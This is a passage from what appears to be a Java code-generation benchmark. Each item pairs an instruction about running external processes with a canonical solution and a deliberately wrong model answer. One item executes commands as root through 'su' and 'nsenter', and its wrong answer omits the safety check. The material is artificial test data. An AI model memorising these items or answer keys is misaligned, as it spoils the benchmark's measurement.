(mSucceedReader != null) {\n                mSucceedReader.close();\n            }\n            if (mErrorReader != null) {\n                mErrorReader.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void exitAndWaitFor() {\n        try {\n            exec(\"exit\");\n            waitFor();\n            exit();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public int waitFor() {\n        try {\n            return mProcess.waitFor();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n            return -1;\n        }\n    }\n\n    public ProcessShell readAll() {\n        readSucceedOutput();\n        readErrorOutput();\n        return this;\n    }\n\n    public ProcessShell readSucceedOutput() {\n        try {\n            String line;\n            while ((line = mSucceedReader.readLine()) != null) {\n                mSucceedOutput.append(line).append(\"\\n\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return this;\n    }\n\n    public ProcessShell readErrorOutput() {\n        try {\n            String line;\n            while ((line = mErrorReader.readLine()) != null) {\n                mErrorOutput.append(line).append(\"\\n\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return this;\n    }\n\n    public StringBuilder getSucceedOutput() {\n        return mSucceedOutput;\n    }\n\n    public StringBuilder getErrorOutput() {\n        return mErrorOutput;\n    }\n\n    public Process getProcess() {\n        return mProcess;\n    }\n\n    public BufferedReader getSucceedReader() {\n        return mSucceedReader;\n    }\n\n    public BufferedReader getErrorReader() {\n        return mErrorReader;\n    }\n}\n```"
  },
  {
    "Task_id": 275,
    "Instruction": "Task Description: Create a Java class that manages external processes, handling their input/output streams and providing control over process execution, including starting, stopping, and monitoring.\n\nClass Description: The DaemonHandler class is designed to manage external processes executed via ProcessBuilder. It provides functionality to start processes with either delimited or undelimited output handling, stop processes (either gracefully or forcibly), and retrieve process exit codes. The class maintains separate threads for handling standard output and error streams, with output being captured and placed into a shared blocking deque.\n\nAttributes:\n- processBuilder: ProcessBuilder - Configures and starts external processes\n- process: Process - Represents the currently running external process\n- outThread: Thread - Thread handling standard output stream\n- errThread: Thread - Thread handling error output stream\n- errProxy: OutputProxy - Proxy for handling error stream output\n- outProxy: OutputProxy - Proxy for handling standard output stream\n- deque: BlockingDeque<Event> - Shared queue for process output events\n- stdOut: boolean - Flag indicating whether to capture standard output\n\nMethods:\n- DaemonHandler(BlockingDeque<Event>, String...) -> void - Constructor that initializes the process handler with output queue and command\n- setStdOutListener(boolean) -> void - Sets whether to capture standard output\n- startDelimited() -> Process - Starts process with delimited output handling (using default delimiter)\n- startDelimited(byte) -> Process - Starts process with custom delimiter for output handling\n- startUndelimited() -> Process - Starts process with undelimited output handling (default buffer size)\n- startUndelimited(int) -> Process - Starts process with undelimited output handling (custom buffer size)\n- stop(boolean) -> void - Stops the managed process (optionally forcibly)\n- getExitCode() -> int - Retrieves the exit code of the process (or PROCESS_STOPPED if not running)",
    "Canonical_solution": "import com.linbit.extproc.OutputProxy.Event;\nimport java.io.IOException;\nimport java.lang.ProcessBuilder.Redirect;\nimport java.util.concurrent.BlockingDeque;\nimport java.util.concurrent.TimeUnit;\n\npublic class DaemonHandler\n{\n    public static final int PROCESS_STOPPED = Integer.MAX_VALUE;\n    private static final byte DELIMITER = '\\n';\n\n    private final ProcessBuilder processBuilder;\n    private Process process;\n\n    private Thread outThread;\n    private Thread errThread;\n    private OutputProxy errProxy;\n    private OutputProxy outProxy;\n\n    private final BlockingDeque<Event> deque;\n    private boolean stdOut;\n\n    public DaemonHandler(final BlockingDeque<Event> dequeRef, final String... command)\n    {\n        deque = dequeRef;\n        processBuilder = new ProcessBuilder(command);\n        processBuilder.redirectError(Redirect.PIPE);\n        stdOut = true;\n    }\n\n    public void setStdOutListener(boolean stdOutRef)\n    {\n        stdOut = stdOutRef;\n    }\n\n    public Process startDelimited() throws IOException\n    {\n        return startDelimited(DELIMITER);\n    }\n\n    public Process startDelimited(byte delimiterRef) throws IOException\n    {\n        stop(true);\n\n        process = processBuilder.start();\n        errProxy = new OutputProxyDelimited(process.getErrorStream(), deque, delimiterRef, false);\n        errThread = new Thread(errProxy);\n        if (stdOut)\n        {\n            outProxy = new OutputProxyDelimited(process.getInputStream(), deque, delimiterRef, true);\n            outThread = new Thread(outProxy);\n            outThread.start();\n        }\n        errThread.start();\n        return process;\n    }\n\n    public Process startUndelimited() throws IOException\n    {\n        return startUndelimited(OutputProxy.DFLT_BUFFER_SIZE);\n    }\n\n    public Process startUndelimited(int bufferSize) throws IOException\n    {\n        stop(true);\n\n        process = processBuilder.start();\n        errProxy = new OutputProxy(process.getErrorStream(), deque, false, bufferSize);\n        errThread = new Thread(errProxy);\n        if (stdOut)\n        {\n            outProxy = new OutputProxy(process.getInputStream(), deque, true, bufferSize);\n            outThread = new Thread(outProxy);\n            outThread.start();\n        }\n        errThread.start();\n        return process;\n    }\n\n    public void stop(boolean force)\n    {\n        if (process != null)\n        {\n            if (outProxy != null)\n            {\n                outProxy.expectShutdown();\n            }\n            errProxy.expectShutdown();\n            if (force)\n            {\n                process.destroyForcibly();\n            }\n            else\n            {\n                process.destroy();\n            }\n            if (outThread != null)\n            {\n                outThread.interrupt();\n            }\n            errThread.interrupt();\n            process = null;\n        }\n    }\n\n    public int getExitCode()\n    {\n        int exitValue;\n        Process proc = process;\n        if (proc != null)\n        {\n            if (proc.isAlive())\n            {\n                try\n                {\n                    proc.waitFor(500, TimeUnit.MILLISECONDS);\n                }\n                catch (InterruptedException ignored)\n                {\n                }\n                if (proc.isAlive())\n                {\n                    throw new ImplementationError(\"Process is still running\");\n                }\n            }\n            exitValue = proc.exitValue();\n        }\n        else\n        {\n            exitValue = PROCESS_STOPPED;\n        }\n        return exitValue;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport java.util.concurrent.BlockingDeque;\nimport java.util.concurrent.LinkedBlockingDeque;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.IOException;\n\nclass DaemonHandler {\n    private ProcessBuilder processBuilder;\n    private Process process;\n    private Thread outThread;\n    private Thread errThread;\n    private OutputProxy errProxy;\n    private OutputProxy outProxy;\n    private BlockingDeque<Event> deque;\n    private boolean stdOut;\n\n    public DaemonHandler(BlockingDeque<Event> deque, String... command) {\n        this.deque = deque;\n        this.processBuilder = new ProcessBuilder(command);\n        this.stdOut = true;\n    }\n\n    public void setStdOutListener(boolean stdOut) {\n        this.stdOut = stdOut;\n    }\n\n    public Process startDelimited() throws IOException {\n        return startDelimited((byte) '\\n');\n    }\n\n    public Process startDelimited(byte delimiter) throws IOException {\n        process = processBuilder.start();\n        outProxy = new OutputProxy(process.getInputStream(), delimiter, deque, stdOut);\n        errProxy = new OutputProxy(process.getErrorStream(), delimiter, deque, true);\n        outThread = new Thread(outProxy);\n        errThread = new Thread(errProxy);\n        outThread.start();\n        errThread.start();\n        return process;\n    }\n\n    public Process startUndelimited() throws IOException {\n        return startUndelimited(8192);\n    }\n\n    public Process startUndelimited(int bufferSize) throws IOException {\n        process = processBuilder.start();\n        outProxy = new OutputProxy(process.getInputStream(), (byte) 0, deque, stdOut);\n        errProxy = new OutputProxy(process.getErrorStream(), (byte) 0, deque, true);\n        outThread = new Thread(outProxy);\n        errThread = new Thread(errProxy);\n        outThread.start();\n        errThread.start();\n        return process;\n    }\n\n    public void stop(boolean forcibly) {\n        if (process != null) {\n            if (forcibly) {\n                process.destroyForcibly();\n            } else {\n                process.destroy();\n            }\n            try {\n                outThread.join();\n                errThread.join();\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    public int getExitCode() {\n        if (process == null) {\n            return -1;\n        }\n        try {\n            return process.exitValue();\n        } catch (IllegalThreadStateException e) {\n            return -1;\n        }\n    }\n\n    static class OutputProxy implements Runnable {\n        private InputStream inputStream;\n        private byte delimiter;\n        private BlockingDeque<Event> deque;\n        private boolean captureOutput;\n\n        public OutputProxy(InputStream inputStream, byte delimiter, BlockingDeque<Event> deque, boolean captureOutput) {\n            this.inputStream = inputStream;\n            this.delimiter = delimiter;\n            this.deque = deque;\n            this.captureOutput = captureOutput;\n        }\n\n        @Override\n        public void run() {\n            try {\n                byte[] buffer = new byte[8192];\n                int bytesRead;\n                StringBuilder line = new StringBuilder();\n                while ((bytesRead = inputStream.read(buffer)) != -1) {\n                    for (int i = 0; i < bytesRead; i++) {\n                        byte b = buffer[i];\n                        if (b == delimiter) {\n                            if (captureOutput) {\n                                deque.addLast(new Event(line.toString()));\n                            }\n                            line = new StringBuilder();\n                        } else {\n                            line.append((char) b);\n                        }\n                    }\n                }\n                if (line.length() > 0 && captureOutput) {\n                    deque.addLast(new Event(line.toString()));\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    static class Event {\n        private String data;\n\n        public Event(String data) {\n            this.data = data;\n        }\n\n        public String getData() {\n            return data;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 278,
    "Instruction": "Task Description: Create a Java function that executes an FFmpeg process to convert a video file into NUT format with raw video and audio codecs, then reads and processes the output using a NutReader.\n\nFunction Description: The function testNutReader() configures and executes an FFmpeg process to convert an input video file into NUT format with specific codec settings (rawvideo for video, pcm_s32le for audio). It then reads and processes the output stream using a NutReader with custom handlers for stream and frame events. The function ensures proper process synchronization by waiting for the FFmpeg process to complete.\n\nInput: None (uses a predefined input file Samples.big_buck_bunny_720p_1mb)\n\nOutput: None (void return type), but the function:\n1. Executes an FFmpeg conversion process\n2. Processes the output through NutReader callbacks\n3. Asserts the process completed successfully (exit code 0)\n\nExceptions:\n- InterruptedException: If the thread is interrupted while waiting for the process\n- ExecutionException: If there's an error in process execution\n- IOException: If there's an I/O error during process handling\n- LineUnavailableException: If there's an audio line availability issue",
    "Canonical_solution": "import java.io.IOException;\nimport java.util.List;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport javax.sound.sampled.LineUnavailableException;\n\npublic void testNutReader()\n    throws InterruptedException, ExecutionException, IOException, LineUnavailableException {\n\n    List<String> args =\n        new FFmpegBuilder()\n            .setInput(Samples.big_buck_bunny_720p_1mb)\n            .done()\n            .addStdoutOutput()\n            .setFormat(\"nut\")\n            .setVideoCodec(\"rawvideo\")\n            .setVideoPixelFormat(\"argb\")\n            .setAudioCodec(\"pcm_s32le\")\n            .done()\n            .build();\n\n    List<String> newArgs =\n        ImmutableList.<String>builder().add(FFmpeg.DEFAULT_PATH).addAll(args).build();\n\n    ProcessBuilder builder = new ProcessBuilder(newArgs);\n    Process p = builder.start();\n\n    new NutReader(\n            p.getInputStream(),\n            new NutReaderListener() {\n                @Override\n                public void stream(Stream stream) {\n                    // Audio stream handling logic\n                }\n\n                @Override\n                public void frame(Frame frame) {\n                    // Frame processing logic\n                }\n            })\n        .read();\n\n    assertEquals(0, p.waitFor());\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public void testNutReader() throws InterruptedException, ExecutionException, IOException, LineUnavailableException {\n    String input = \"Samples.big_buck_bunny_720p_1mb\";\n    ProcessBuilder processBuilder = new ProcessBuilder(\"ffmpeg\", \"-i\", input, \"-c:v\", \"rawvideo\", \"-c:a\", \"pcm_s32le\", \"output.nut\");\n    processBuilder.redirectErrorStream(true);\n    Process process = processBuilder.start();\n    NutReader nutReader = new NutReader();\n    nutReader.setStreamHandler((stream) -> System.out.println(\"Stream: \" + stream));\n    nutReader.setFrameHandler((frame) -> System.out.println(\"Frame: \" + frame));\n    nutReader.read(process.getInputStream());\n    int exitCode = process.waitFor();\n    assert exitCode == 0;\n}"
  },
  {
    "Task_id": 279,
    "Instruction": "Task Description: Create a Java class that facilitates interaction with external processes through command execution, providing methods for writing input, executing commands, and retrieving results, with support for timeout handling and resource cleanup.\n\nClass Description: The Command class encapsulates functionality for executing and interacting with external processes. It handles process creation, input/output stream management, command execution, and result collection, with features for line-based input, process termination, and timeout control.\n\nAttributes:\n\nprocess: [Process] - The running external process instance\nstdIn: [OutputStream] - Stream for writing input to the process\nstdOut: [File] - Temporary file storing the process's standard output\nstdErr: [File] - Temporary file storing the process's error output\nnextLine: [String] - Line separator string for command input\nexit: [String] - Command string to terminate the process\ncharset: [Charset] - Character encoding for input/output\nstartTime: [LocalDateTime] - Timestamp when the process was started\n\nMethods:\n\nof: [of(String init)] -> [Command] - Creates a Command instance with default settings\nof: [of(String init, Charset charset)] -> [Command] - Creates a Command instance with specified charset\nof: [of(String init, String nextLine, String exit, Charset charset)] -> [Command] - Creates a Command instance with custom settings\nwrite: [write(String str)] -> [Command] - Writes a string to the process's input stream\nline: [line()] -> [Command] - Writes a line separator to the process's input stream\nexit: [exit()] -> [Command] - Sends the exit command to terminate the process\nexec: [exec(String str)] -> [Command] - Executes a command string (writes input and adds line separator)\nresult: [result()] -> [CommandResult] - Waits for process completion and returns results\nresult: [result(long millis)] -> [CommandResult] - Waits with timeout for process completion\nclose: [close()] -> [void] - Terminates the process and releases resources",
    "Canonical_solution": "import java.io.File;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.nio.charset.Charset;\nimport java.time.LocalDateTime;\nimport java.util.StringTokenizer;\nimport java.util.concurrent.TimeUnit;\n\npublic final class Command {\n\n    public static final String NEXT_LINE = SystemUtils.lineSeparator();\n    public static final String EXIT_COMMAND = \"exit\";\n\n    private final Process process;\n    private final OutputStream stdIn;\n    private final File stdOut;\n    private final File stdErr;\n    private final String nextLine;\n    private final String exit;\n    private final Charset charset;\n    private final LocalDateTime startTime;\n\n    private Command(String init, String nextLine, String exit, Charset charset) throws IOException {\n        if (!StringUtils.hasText(init)) {\n            throw new IllegalArgumentException(\"Empty init\");\n        }\n        StringTokenizer st = new StringTokenizer(init);\n        String[] cmdArray = new String[st.countTokens()];\n        for (int i = 0; st.hasMoreTokens(); i++) {\n            cmdArray[i] = st.nextToken();\n        }\n\n        this.stdOut = FileUtils.createTemp();\n        this.stdErr = FileUtils.createTemp();\n\n        ProcessBuilder builder = new ProcessBuilder(cmdArray).redirectError(this.stdErr).redirectOutput(this.stdOut);\n        this.process = builder.start();\n        this.stdIn = this.process.getOutputStream();\n        this.nextLine = nextLine;\n        this.exit = exit;\n        this.charset = charset;\n        this.startTime = LocalDateTime.now();\n    }\n\n    public static Command of(String init) throws IOException {\n        return of(init, SystemUtils.charset());\n    }\n\n    public static Command of(String init, Charset charset) throws IOException {\n        return of(init, NEXT_LINE, EXIT_COMMAND, charset);\n    }\n\n    public static Command of(String init, String nextLine, String exit, Charset charset) throws IOException {\n        return new Command(init, nextLine, exit, charset);\n    }\n\n    public Command write(String str) throws IOException {\n        this.stdIn.write(str.getBytes(this.charset));\n        this.stdIn.flush();\n        return this;\n    }\n\n    public Command line() throws IOException {\n        return write(this.nextLine);\n    }\n\n    public Command exit() throws IOException {\n        write(this.exit);\n        return line();\n    }\n\n    public Command exec(String str) throws IOException {\n        write(str);\n        return line();\n    }\n\n    public CommandResult result() throws InterruptedException {\n        this.process.waitFor();\n        return CommandResult.of(this.stdOut, this.stdErr, this.startTime, LocalDateTime.now(), this.charset);\n    }\n\n    public CommandResult result(long millis) throws InterruptedException, CommandTimeoutException {\n        if (this.process.waitFor(millis, TimeUnit.MILLISECONDS)) {\n            return result();\n        }\n        this.process.destroyForcibly();\n        throw new CommandTimeoutException();\n    }\n\n    public void close() {\n        this.process.destroy();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class Command {\n    private Process process;\n    private OutputStream stdIn;\n    private File stdOut;\n    private File stdErr;\n    private String nextLine;\n    private String exit;\n    private Charset charset;\n    private LocalDateTime startTime;\n\n    private Command(String init, Charset charset, String nextLine, String exit) throws IOException {\n        this.charset = charset != null ? charset : StandardCharsets.UTF_8;\n        this.nextLine = nextLine != null ? nextLine : \"\\n\";\n        this.exit = exit != null ? exit : \"exit\";\n        this.stdOut = File.createTempFile(\"command_out\", \".txt\");\n        this.stdErr = File.createTempFile(\"command_err\", \".txt\");\n        this.stdOut.deleteOnExit();\n        this.stdErr.deleteOnExit();\n\n        ProcessBuilder builder = new ProcessBuilder(init.split(\"\\\\s+\"));\n        builder.redirectError(stdErr);\n        builder.redirectOutput(stdOut);\n        this.process = builder.start();\n        this.stdIn = process.getOutputStream();\n        this.startTime = LocalDateTime.now();\n    }\n\n    public static Command of(String init) throws IOException {\n        return new Command(init, null, null, null);\n    }\n\n    public static Command of(String init, Charset charset) throws IOException {\n        return new Command(init, charset, null, null);\n    }\n\n    public static Command of(String init, String nextLine, String exit, Charset charset) throws IOException {\n        return new Command(init, charset, nextLine, exit);\n    }\n\n    public Command write(String str) throws IOException {\n        stdIn.write(str.getBytes(charset));\n        stdIn.flush();\n        return this;\n    }\n\n    public Command line() throws IOException {\n        stdIn.write(nextLine.getBytes(charset));\n        stdIn.flush();\n        return this;\n    }\n\n    public Command exit() throws IOException {\n        stdIn.write(exit.getBytes(charset));\n        stdIn.write(nextLine.getBytes(charset));\n        stdIn.flush();\n        return this;\n    }\n\n    public Command exec(String str) throws IOException {\n        write(str);\n        line();\n        return this;\n    }\n\n    public CommandResult result() throws IOException, InterruptedException {\n        return result(0);\n    }\n\n    public CommandResult result(long millis) throws IOException, InterruptedException {\n        if (millis <= 0) {\n            process.waitFor();\n        } else {\n            boolean finished = process.waitFor(millis, TimeUnit.MILLISECONDS);\n            if (!finished) {\n                process.destroyForcibly();\n            }\n        }\n        return new CommandResult(stdOut, stdErr, process.exitValue(), Duration.between(startTime, LocalDateTime.now()).toMillis());\n    }\n\n    public void close() {\n        try {\n            process.destroyForcibly();\n            stdIn.close();\n            stdOut.delete();\n            stdErr.delete();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static class CommandResult {\n        private final File stdOut;\n        private final File stdErr;\n        private final int exitCode;\n        private final long duration;\n\n        public CommandResult(File stdOut, File stdErr, int exitCode, long duration) {\n            this.stdOut = stdOut;\n            this.stdErr = stdErr;\n            this.exitCode = exitCode;\n            this.duration = duration;\n        }\n\n        public File getStdOut() {\n            return stdOut;\n        }\n\n        public File getStdErr() {\n            return stdErr;\n        }\n\n        public int getExitCode() {\n            return exitCode;\n        }\n\n        public long getDuration() {\n            return duration;\n        }\n    }\n}"
  },
  {
    "Task_id": 280,
    "Instruction": "Task Description: Implement a Java function that executes a shell command with root privileges using ProcessBuilder, handles input/output streams, and properly manages process lifecycle and error handling.\n\nFunction Description: The function executes a given shell command with root privileges by spawning a new process through ProcessBuilder. It uses 'su' to gain root access and 'nsenter' to enter the root namespace. The function handles command safety checks, process I/O streams, error redirection, and proper resource cleanup. It returns the command output or error messages.\n\nInput: \n- cmd: String - The shell command to be executed with root privileges\n\nOutput: \n- String - The output of the executed command (stdout) or error message if execution fails. The output string is cleaned to remove trailing newlines and unnecessary error prefixes.\n\nNote: The function includes a safety check (isSafeCommand) to prevent dangerous operations, though its implementation isn't shown in the reference code.",
    "Canonical_solution": "import java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.BufferedReader;\n\npublic static String rootExecCmd(String cmd) {\n    if (!isSafeCommand(cmd)) return \"Cannot exec this command: Dangerous operation\";\n    StringBuilder result = new StringBuilder();\n    ProcessBuilder pb = new ProcessBuilder(\"su\");\n    Process p;\n    DataOutputStream dos = null;\n    DataInputStream dis = null;\n    try {\n        pb.redirectErrorStream(true);\n        p = pb.start();\n        dos = new DataOutputStream(p.getOutputStream());\n        dis = new DataInputStream(p.getInputStream());\n        dos.writeBytes(\"nsenter --mount=/proc/1/ns/mnt -- \" + cmd + \"\\n\");\n        dos.flush();\n        dos.writeBytes(\"exit\\n\");\n        dos.flush();\n        String line;\n        while ((line = dis.readLine()) != null) {\n            result.append(line).append(\"\\n\");\n        }\n        p.waitFor();\n    } catch (Exception e) {\n        if (!cmd.contains(\"nsenter\") && String.valueOf(e).contains(\"nsenter: exec \")) {\n            return String.valueOf(e).replace(\"nsenter: exec \", \"\");\n        } else {\n            return String.valueOf(e);\n        }\n    } finally {\n        if (dos != null) {\n            try {\n                dos.close();\n            } catch (IOException e) {\n                if (!cmd.contains(\"nsenter\") && String.valueOf(e).contains(\"nsenter: exec \")) {\n                    return String.valueOf(e).replace(\"nsenter: exec \", \"\");\n                } else {\n                    return String.valueOf(e);\n                }\n            }\n        }\n        if (dis != null) {\n            try {\n                dis.close();\n            } catch (IOException e) {\n                if (!cmd.contains(\"nsenter\") && String.valueOf(e).contains(\"nsenter: exec \")) {\n                    return String.valueOf(e).replace(\"nsenter: exec \", \"\");\n                } else {\n                    return String.valueOf(e);\n                }\n            }\n        }\n    }\n    if (result.length() > 0) {\n        result = new StringBuilder(result.substring(0, result.length() - 1));\n    }\n    if (!cmd.contains(\"nsenter\") && result.toString().contains(\"nsenter: exec \")) {\n        return result.toString().replace(\"nsenter: exec \", \"\");\n    } else {\n        return result.toString();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public static String executeWithRoot(String cmd) {\n    try {\n        ProcessBuilder processBuilder = new ProcessBuilder(\"su\", \"-c\", \"nsenter --mount=/proc/1/ns/mnt \" + cmd);\n        processBuilder.redirectErrorStream(true);\n        Process process = processBuilder.start();\n        StringBuilder output = new StringBuilder();\n        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            output.append(line).append(\"\\n\");\n        }\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new RuntimeException(\"Command execution failed with exit code: \" + exitCode);\n        }\n        return output.toString().trim();\n    } catch (Exception e) {\n        return \"Error: \" + e.getMessage();\n    }\n}"
  },
  {
    "Task_id": 281,
    "Instruction": "Task Description: Create a function that executes an external process, captures its output (including error streams redirected to standard output), and returns the output as a string.\n\nFunction Description: The function uses Java's ProcessBuilder to start an external process specified by the given command. It redirects the error stream to the standard output stream to capture all output in one place. The function reads the process's output stream line by line, collects it into a string, and waits for the process to complete before returning the collected output.\n\nInput: \n- cmd: String[] - An array of strings representing the command to execute and its arguments.\n\nOutput: \n- String - The combined standard output and error output of the executed process, trimmed of any leading or trailing whitespace.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.concurrent.TimeUnit;\n\npublic static String getProcessOutput(String[] cmd) throws IOException, InterruptedException {\n    ProcessBuilder processBuilder = new ProcessBuilder(cmd);\n    processBuilder.redirectErrorStream(true);\n    Process process = processBuilder.start();\n    StringBuilder processOutput = new StringBuilder();\n    try (BufferedReader processOutputReader = new BufferedReader(\n            new InputStreamReader(process.getInputStream()));) {\n        String readLine;\n        while ((readLine = processOutputReader.readLine()) != null) {\n            processOutput.append(readLine + System.lineSeparator());\n        }\n        process.waitFor();\n    }\n    return processOutput.toString().trim();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\npublic static String executeCommand(String[] cmd) {\n    StringBuilder output = new StringBuilder();\n    try {\n        ProcessBuilder processBuilder = new ProcessBuilder(cmd);\n        processBuilder.redirectErrorStream(true);\n        Process process = processBuilder.start();\n        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            output.append(line).append(\"\\n\");\n        }\n        process.waitFor();\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n    return output.toString().trim();\n}\n```"
  },
  {
    "Task_id": 282,
    "Instruction": "Task Description: Create a Java function that executes an external process using ProcessBuilder, captures its output, and handles errors appropriately.\n\nFunction Description: The function executes a shell command constructed from configuration parameters, captures the process's standard output and error streams (merged), waits for the process to complete, and returns the exit status or throws an exception if the process fails. The function handles process initialization, stream reading, and error management.\n\nInput:\n- job: Job<Object> - A job object containing configuration details\n- parameters: Map<String, Object> - A map of parameters used to construct the shell command\n\nOutput:\n- Object - Returns 0 if the process exits successfully, otherwise throws a HugeException containing the exit code and process output\n\nNote: The function includes error handling for process initialization, execution, and stream reading, with all exceptions wrapped in HugeException. The process's working directory is set to executeDir(), and error streams are redirected to standard output.",
    "Canonical_solution": "import java.io.File;\nimport java.io.InputStreamReader;\nimport java.io.LineNumberReader;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic Object call(Job<Object> job, Map<String, Object> parameters) {\n    this.checkAndCollectParameters(parameters);\n    try {\n        this.initializeConfig((ComputerJob) job);\n    } catch (Exception e) {\n        throw new HugeException(\n                \"Failed to initialize computer config file\", e);\n    }\n\n    Map<String, Object> configs = new HashMap<>();\n    configs.putAll(this.commonConfig);\n    configs.putAll(this.checkAndCollectParameters(parameters));\n\n    String[] command = this.constructShellCommands(configs);\n    LOG.info(\"Execute computer job: {}\", String.join(SPACE, command));\n\n    try {\n        ProcessBuilder builder = new ProcessBuilder(command);\n        builder.redirectErrorStream(true);\n        builder.directory(new File(executeDir()));\n\n        Process process = builder.start();\n\n        StringBuilder output = new StringBuilder();\n        try (LineNumberReader reader = new LineNumberReader(\n                new InputStreamReader(\n                        process.getInputStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n        }\n\n        int exitCode = process.waitFor();\n        if (exitCode == 0) {\n            return 0;\n        }\n\n        throw new HugeException(\"The computer job exit with code %s: %s\",\n                                exitCode, output);\n    } catch (HugeException e) {\n        throw e;\n    } catch (Throwable e) {\n        throw new HugeException(\"Failed to execute computer job\", e);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\npublic Object executeProcess(Job<Object> job, Map<String, Object> parameters) throws HugeException {\n    try {\n        String command = buildCommand(job, parameters);\n        ProcessBuilder processBuilder = new ProcessBuilder(command.split(\" \"));\n        processBuilder.directory(new File(executeDir()));\n        processBuilder.redirectErrorStream(true);\n        Process process = processBuilder.start();\n        InputStream inputStream = process.getInputStream();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        StringBuilder output = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            output.append(line).append(\"\\n\");\n        }\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new HugeException(\"Process failed with exit code \" + exitCode + \": \" + output.toString());\n        }\n        return 0;\n    } catch (IOException | InterruptedException e) {\n        throw new HugeException(\"Error executing process: \" + e.getMessage(), e);\n    }\n}\n```"
  },
  {
    "Task_id": 286,
    "Instruction": "Task Description: Create a Java class that manages an interactive shell process (either regular or root) with proper stream handling, command execution, and event notification capabilities.\n\nClass Description: The ShellStream class provides an interface to execute commands in a shell process (sh or su) while managing input/output streams and notifying listeners about process events. It handles command execution synchronization, stream monitoring, and process lifecycle management.\n\nAttributes:\n- mConnection: Process - The running shell process instance\n- mStdInput: DataOutputStream - Stream for writing commands to the process\n- mStdOutput: BufferedReader - Stream for reading process output\n- mStdOutputWorker: Thread - Worker thread for monitoring output stream\n- mListener: OnStreamListener - Callback interface for process events\n- mCounter: Counter - Thread-safe counter for active commands\n- mLock: Object - Synchronization lock object\n- mIsActive: Boolean - Flag indicating if the process is active\n- mIsRoot: Boolean - Flag indicating if using root shell (su)\n- mCommandEnd: String - Unique marker for command termination\n\nMethods:\n- ShellStream(Boolean requestRoot, OnStreamListener listener) -> void - Constructor that initializes the shell process (root or regular) and sets up stream handlers\n- execute(String command) -> void - Executes a shell command asynchronously and tracks its completion\n- waitFor() -> Boolean - Waits indefinitely for all commands to complete\n- waitFor(Integer timeout) -> Boolean - Waits with timeout for all commands to complete\n- waitFor(Integer timeout, Integer index) -> Boolean - Internal wait method with timeout and counter adjustment\n- isActive() -> Boolean - Returns if the shell process is active\n- isRunning() -> Boolean - Returns if any commands are currently executing\n- isRoot() -> Boolean - Returns if using root shell\n- destroy() -> void - Cleanly terminates the shell process and releases resources\n\nNested Interfaces:\n- OnStreamListener: Interface for process event callbacks\n  - onStreamStart(): Notifies when command execution starts\n  - onStreamInput(String): Provides process output lines\n  - onStreamStop(Integer): Notifies when command completes with exit code\n  - onStreamDied(): Notifies when process terminates unexpectedly\n\nNested Classes:\n- Counter: Thread-safe counter implementation\n  - size() -> Integer: Gets current count\n  - encrease() -> Integer: Increments counter\n  - decrease() -> Integer: Decrements counter\n  - reset() -> void: Resets counter to zero",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport android.util.Log;\n\npublic class ShellStream {\n    public static final String TAG = Common.TAG + \".ShellStream\";\n    \n    protected Process mConnection;\n    protected DataOutputStream mStdInput;\n    protected BufferedReader mStdOutput;\n    protected Thread mStdOutputWorker;\n    protected OnStreamListener mListener;\n    protected final Counter mCounter = new Counter();\n    protected final Object mLock = new Object();\n    protected Boolean mIsActive = false;\n    protected Boolean mIsRoot = false;\n    protected String mCommandEnd = \"EOL:a00c38d8:EOL\";\n    \n    protected static class Counter {\n        private volatile Integer mCount = 0;\n        private volatile Object mLock = new Object();\n        \n        public Integer size() {\n            synchronized(mLock) {\n                return mCount;\n            }\n        }\n        \n        public Integer encrease() {\n            synchronized(mLock) {\n                return (mCount += 1);\n            }\n        }\n        \n        public Integer decrease() {\n            synchronized(mLock) {\n                return mCount > 0 ? (mCount -= 1) : (mCount = 0);\n            }\n        }\n        \n        public void reset() {\n            synchronized(mLock) {\n                mCount = 0;\n            }\n        }\n    }\n    \n    public static interface OnStreamListener {\n        public void onStreamStart();\n        public void onStreamInput(String outputLine);\n        public void onStreamStop(Integer resultCode);\n        public void onStreamDied();\n    }\n    \n    public ShellStream(Boolean requestRoot, OnStreamListener listener) {\n        try {\n            